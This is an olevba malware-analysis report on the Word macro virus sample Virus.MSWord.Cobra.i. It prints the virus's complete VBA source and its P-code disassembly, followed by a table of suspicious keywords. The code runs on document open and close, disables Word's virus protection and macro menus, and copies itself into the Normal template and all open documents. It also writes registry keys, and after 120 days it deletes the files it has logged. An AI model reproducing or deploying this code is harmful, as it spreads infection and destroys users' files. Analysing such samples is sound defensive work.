olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cobra.i
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cobra.i - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AAX_10A.bas 
in file: Virus.MSWord.Cobra.i - OLE stream: 'Macros/VBA/AAX_10A'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'AAX Version 1.0A
'A intelligent member of Cobra family

Sub AutoClose()
Call MacToTemToDoc
End Sub
Sub AutoOpen()
Call MacToTemToDoc
End Sub
Sub FileNew()
Call MacToTemToDoc
Dialogs(wdDialogFileNew).Show
End Sub
Sub FileExit()
Call MacToTemToDoc
WordBasic.FileExit
End Sub
Sub MacToTemToDoc()
On Error Resume Next
CustomizationContext = NormalTemplate
CommandBars("Tools").Controls("Macro").Enabled = False
CommandBars("Tools").Controls("Macro").Visible = False
CommandBars("Tools").Controls("Macro").Delete
CommandBars("View").Controls("Toolbars").Enabled = False
CommandBars("View").Controls("Toolbars").Visible = False
CommandBars("View").Controls("Toolbars").Delete
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
Options.VirusProtection = False
Options.SaveNormalPrompt = False
MacT = False
MacD = False
For Each MacrN In NormalTemplate.VBProject.VBComponents
If (MacrN.Name <> "ThisDocument" And MacrN.Name <> "AAX_10A" And Left(MacrN.Name, 5) <> "Cobra") Then
Application.OrganizerDelete Source:=NormalTemplate.FullName, _
Name:=MacrN.Name, Object:=wdOrganizerObjectProjectItems
End If
Next
For Each MacrN In NormalTemplate.VBProject.VBComponents
If MacrN.Name = "AAX_10A" Then
MacT = True
End If
Next
If MacT = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, _
Destination:=NormalTemplate.FullName, Name:="AAX_10A", _
Object:=wdOrganizerObjectProjectItems
End If
For Each DOC In Documents
For Each MacrN In DOC.VBProject.VBComponents
If (MacrN.Name <> "ThisDocument" And _
MacrN.Name <> "Reference to Normal" And MacrN.Name <> "AAX_10A") _
And Left(MacrN.Name, 5) <> "Cobra" Then
Application.OrganizerDelete Source:=DOC.FullName, _
Name:=MacrN.Name, Object:=wdOrganizerObjectProjectItems
End If
Next
Next
For Each DOC In Documents
MacD = False
For Each MacrN In DOC.VBProject.VBComponents
If MacrN.Name = "AAX_10A" Then
MacD = True
End If
Next
If MacD = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, _
Destination:=DOC.FullName, Name:="AAX_10A", _
Object:=wdOrganizerObjectProjectItems
End If
Next
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") <> "Cobra ALIAS Liton" Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "Cobra ALIAS Liton"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\", "RegisteredOrganization") = "Shibrampur/Burichang/Comilla"
End If
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra\", "") = "" Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra\", "") = "Cobra"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra\", "Inf") = Format(Date, "mm/dd/yyyy")
End If
FileFound = False
For i = 9 To 1 Step -1
FilName = "Doc" & i
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra\File List", FilName) = ActiveDocument.FullName Then
FileFound = True
End If
Next
If FileFound = False Then
For i = 8 To 1 Step -1
FilName = "Doc" & i
GetList = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra\File List", FilName)
If GetList <> "" Then
FilName = "Doc" & (i + 1)
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra\File List", FilName) = GetList
End If
Next
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra\File List", "Doc1") = ActiveDocument.FullName
End If
IDT = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra\", "Inf")
CDT = Format(Date, "mm/dd/yyyy")
If DateValue(CDT) - DateValue(IDT) > 90 Then
MCF = False
For Each CM In ActiveDocument.VBProject.VBComponents
If CM.Name = "Cobra" Then
MCF = True
End If
Next
If MCF = False Then
Set AMod = ActiveDocument.VBProject.VBComponents.Add(vbext_ct_StdModule)
AMod.Name = "Cobra"
AModCode = "Sub FileOpen" + Chr(13) + _
"On Error Resume Next" + Chr(13) + _
"Dialogs(wdDialogFileOpen).Show " + Chr(13) + _
"ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatTemplate" + Chr(13) + _
"ActiveDocument.SaveAs FileName:=NormalTemplate.Path + ""\Cobra"", FileFormat:=wdFormatTemplate" + Chr(13) + _
"End Sub"
ActiveDocument.VBProject.VBComponents(AMod.Name).CodeModule.InsertLines 1, AModCode
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
End If
If DateValue(CDT) - DateValue(IDT) > 120 Then
For i = 9 To 1 Step -1
FilName = "Doc" & i
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra\File List", FilName) <> "" Then
Kill System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra\File List", FilName)
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra\File List", FilName) = ""
End If
Next
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Cobra.i
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/AAX_10A - 7828 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0010 "AAX Version 1.0A"
' Line #1:
' 	QuoteRem 0x0000 0x0024 "A intelligent member of Cobra family"
' Line #2:
' Line #3:
' 	FuncDefn (Sub AutoClose())
' Line #4:
' 	ArgsCall (Call) MacToTemToDoc 0x0000 
' Line #5:
' 	EndSub 
' Line #6:
' 	FuncDefn (Sub AutoOpen())
' Line #7:
' 	ArgsCall (Call) MacToTemToDoc 0x0000 
' Line #8:
' 	EndSub 
' Line #9:
' 	FuncDefn (Sub FileNew())
' Line #10:
' 	ArgsCall (Call) MacToTemToDoc 0x0000 
' Line #11:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #12:
' 	EndSub 
' Line #13:
' 	FuncDefn (Sub FileExit())
' Line #14:
' 	ArgsCall (Call) MacToTemToDoc 0x0000 
' Line #15:
' 	Ld WordBasic 
' 	ArgsMemCall FileExit 0x0000 
' Line #16:
' 	EndSub 
' Line #17:
' 	FuncDefn (Sub MacToTemToDoc())
' Line #18:
' 	OnError (Resume Next) 
' Line #19:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #20:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #21:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #22:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #23:
' 	LitVarSpecial (False)
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #24:
' 	LitVarSpecial (False)
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #25:
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #26:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #27:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #28:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #29:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #30:
' 	LitVarSpecial (False)
' 	St MacT 
' Line #31:
' 	LitVarSpecial (False)
' 	St MacD 
' Line #32:
' 	StartForVariable 
' 	Ld MacrN 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #33:
' 	Ld MacrN 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Ld MacrN 
' 	MemLd New 
' 	LitStr 0x0007 "AAX_10A"
' 	Ne 
' 	And 
' 	Ld MacrN 
' 	MemLd New 
' 	LitDI2 0x0005 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0005 "Cobra"
' 	Ne 
' 	And 
' 	Paren 
' 	IfBlock 
' Line #34:
' 	LineCont 0x0004 09 00 00 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld MacrN 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	StartForVariable 
' 	Next 
' Line #37:
' 	StartForVariable 
' 	Ld MacrN 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #38:
' 	Ld MacrN 
' 	MemLd New 
' 	LitStr 0x0007 "AAX_10A"
' 	Eq 
' 	IfBlock 
' Line #39:
' 	LitVarSpecial (True)
' 	St MacT 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Next 
' Line #42:
' 	Ld MacT 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #43:
' 	LineCont 0x0008 09 00 00 00 13 00 00 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "AAX_10A"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	StartForVariable 
' 	Ld DOC 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #46:
' 	StartForVariable 
' 	Ld MacrN 
' 	EndForVariable 
' 	Ld DOC 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #47:
' 	LineCont 0x0008 08 00 00 00 14 00 00 00
' 	Ld MacrN 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Ld MacrN 
' 	MemLd New 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	And 
' 	Ld MacrN 
' 	MemLd New 
' 	LitStr 0x0007 "AAX_10A"
' 	Ne 
' 	And 
' 	Paren 
' 	Ld MacrN 
' 	MemLd New 
' 	LitDI2 0x0005 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0005 "Cobra"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #48:
' 	LineCont 0x0004 09 00 00 00
' 	Ld DOC 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld MacrN 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	StartForVariable 
' 	Next 
' Line #51:
' 	StartForVariable 
' 	Next 
' Line #52:
' 	StartForVariable 
' 	Ld DOC 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #53:
' 	LitVarSpecial (False)
' 	St MacD 
' Line #54:
' 	StartForVariable 
' 	Ld MacrN 
' 	EndForVariable 
' 	Ld DOC 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #55:
' 	Ld MacrN 
' 	MemLd New 
' 	LitStr 0x0007 "AAX_10A"
' 	Eq 
' 	IfBlock 
' Line #56:
' 	LitVarSpecial (True)
' 	St MacD 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	StartForVariable 
' 	Next 
' Line #59:
' 	Ld MacD 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #60:
' 	LineCont 0x0008 09 00 00 00 13 00 00 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld DOC 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "AAX_10A"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	StartForVariable 
' 	Next 
' Line #63:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0011 "Cobra ALIAS Liton"
' 	Ne 
' 	IfBlock 
' Line #64:
' 	LitStr 0x0011 "Cobra ALIAS Liton"
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #65:
' 	LitStr 0x001C "Shibrampur/Burichang/Comilla"
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x0016 "RegisteredOrganization"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	LitStr 0x0000 ""
' 	LitStr 0x0019 "HKEY_LOCAL_MACHINE\Cobra\"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #68:
' 	LitStr 0x0005 "Cobra"
' 	LitStr 0x0000 ""
' 	LitStr 0x0019 "HKEY_LOCAL_MACHINE\Cobra\"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #69:
' 	Ld Date 
' 	LitStr 0x000A "mm/dd/yyyy"
' 	ArgsLd Format$ 0x0002 
' 	LitStr 0x0000 ""
' 	LitStr 0x0019 "HKEY_LOCAL_MACHINE\Cobra\"
' 	LitStr 0x0003 "Inf"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	LitVarSpecial (False)
' 	St FileFound 
' Line #72:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0009 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #73:
' 	LitStr 0x0003 "Doc"
' 	Ld i 
' 	Concat 
' 	St FilName 
' Line #74:
' 	LitStr 0x0000 ""
' 	LitStr 0x0022 "HKEY_LOCAL_MACHINE\Cobra\File List"
' 	Ld FilName 
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Eq 
' 	IfBlock 
' Line #75:
' 	LitVarSpecial (True)
' 	St FileFound 
' Line #76:
' 	EndIfBlock 
' Line #77:
' 	StartForVariable 
' 	Next 
' Line #78:
' 	Ld FileFound 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #79:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0008 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #80:
' 	LitStr 0x0003 "Doc"
' 	Ld i 
' 	Concat 
' 	St FilName 
' Line #81:
' 	LitStr 0x0000 ""
' 	LitStr 0x0022 "HKEY_LOCAL_MACHINE\Cobra\File List"
' 	Ld FilName 
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St GetList 
' Line #82:
' 	Ld GetList 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #83:
' 	LitStr 0x0003 "Doc"
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Concat 
' 	St FilName 
' Line #84:
' 	Ld GetList 
' 	LitStr 0x0000 ""
' 	LitStr 0x0022 "HKEY_LOCAL_MACHINE\Cobra\File List"
' 	Ld FilName 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #85:
' 	EndIfBlock 
' Line #86:
' 	StartForVariable 
' 	Next 
' Line #87:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitStr 0x0000 ""
' 	LitStr 0x0022 "HKEY_LOCAL_MACHINE\Cobra\File List"
' 	LitStr 0x0004 "Doc1"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #88:
' 	EndIfBlock 
' Line #89:
' 	LitStr 0x0000 ""
' 	LitStr 0x0019 "HKEY_LOCAL_MACHINE\Cobra\"
' 	LitStr 0x0003 "Inf"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St IDT 
' Line #90:
' 	Ld Date 
' 	LitStr 0x000A "mm/dd/yyyy"
' 	ArgsLd Format$ 0x0002 
' 	St CDT 
' Line #91:
' 	Ld CDT 
' 	ArgsLd DateValue 0x0001 
' 	Ld IDT 
' 	ArgsLd DateValue 0x0001 
' 	Sub 
' 	LitDI2 0x005A 
' 	Gt 
' 	IfBlock 
' Line #92:
' 	LitVarSpecial (False)
' 	St MCF 
' Line #93:
' 	StartForVariable 
' 	Ld CM 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #94:
' 	Ld CM 
' 	MemLd New 
' 	LitStr 0x0005 "Cobra"
' 	Eq 
' 	IfBlock 
' Line #95:
' 	LitVarSpecial (True)
' 	St MCF 
' Line #96:
' 	EndIfBlock 
' Line #97:
' 	StartForVariable 
' 	Next 
' Line #98:
' 	Ld MCF 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #99:
' 	SetStmt 
' 	Ld vbext_ct_StdModule 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Add 0x0001 
' 	Set AMod 
' Line #100:
' 	LitStr 0x0005 "Cobra"
' 	Ld AMod 
' 	MemSt New 
' Line #101:
' 	LineCont 0x0014 09 00 00 00 10 00 00 00 17 00 00 00 1E 00 00 00 25 00 00 00
' 	LitStr 0x000C "Sub FileOpen"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0014 "On Error Resume Next"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001F "Dialogs(wdDialogFileOpen).Show "
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0055 "ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatTemplate"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x005C "ActiveDocument.SaveAs FileName:=NormalTemplate.Path + "\Cobra", FileFormat:=wdFormatTemplate"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	St AModCode 
' Line #102:
' 	LitDI2 0x0001 
' 	Ld AModCode 
' 	Ld AMod 
' 	MemLd New 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #103:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #104:
' 	EndIfBlock 
' Line #105:
' 	EndIfBlock 
' Line #106:
' 	Ld CDT 
' 	ArgsLd DateValue 0x0001 
' 	Ld IDT 
' 	ArgsLd DateValue 0x0001 
' 	Sub 
' 	LitDI2 0x0078 
' 	Gt 
' 	IfBlock 
' Line #107:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0009 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #108:
' 	LitStr 0x0003 "Doc"
' 	Ld i 
' 	Concat 
' 	St FilName 
' Line #109:
' 	LitStr 0x0000 ""
' 	LitStr 0x0022 "HKEY_LOCAL_MACHINE\Cobra\File List"
' 	Ld FilName 
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #110:
' 	LitStr 0x0000 ""
' 	LitStr 0x0022 "HKEY_LOCAL_MACHINE\Cobra\File List"
' 	Ld FilName 
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	ArgsCall Kill 0x0001 
' Line #111:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0022 "HKEY_LOCAL_MACHINE\Cobra\File List"
' 	Ld FilName 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #112:
' 	EndIfBlock 
' Line #113:
' 	StartForVariable 
' 	Next 
' Line #114:
' 	EndIfBlock 
' Line #115:
' 	EndSub 
' Line #116:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

